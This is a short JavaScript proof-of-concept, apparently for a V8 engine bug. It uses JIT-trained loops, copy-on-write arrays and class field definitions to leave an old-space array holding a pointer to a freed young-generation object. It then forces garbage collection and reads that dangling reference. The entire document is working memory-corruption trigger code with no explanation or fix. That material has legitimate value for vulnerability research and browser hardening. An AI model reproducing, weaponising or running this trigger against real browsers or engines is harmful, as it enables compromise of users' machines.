function ForceGC() { try { new ArrayBuffer(2 ** 34); } catch {} }  
  
old_space_array = Array(1, 2);  
  
function CopyElement(from, to) { to[0] = from[0]; } // no write barrier for smi arrays  
for (let i = 0; i < 10000; ++i) {  
  CopyElement(old_space_array, old_space_array);  
}  
  
ForceGC();  
  
function MakeCOW() { return [0]; }  
original_cow_object = MakeCOW();  
  
function MakeCopy() {  
  let copy = original_cow_object.concat(); // create a new object with COW elements  
  copy.splice(); // copy the elements  
  return copy;  
}  
  
new_value = 1;  
new_value = {}; // mark the cell as mutable  
  
function ReturnHolder() { return define_property_holder }  
class Trigger extends ReturnHolder { 0 = new_value; }  
  
for (let i = 0; i < 10000; ++i) {  
  define_property_holder = MakeCopy();  
  new Trigger();  
}  
  
new_value = {};  
define_property_holder = MakeCOW();  
new Trigger();  
  
new_space_array = MakeCOW();  
new_space_array.splice();  
  
CopyElement(new_space_array, old_space_array);  
  
new_value = "";  
define_property_holder = MakeCOW();  
new Trigger();  
  
new_space_array = null;  
ForceGC();  
  
console.log(old_space_array[0][0]);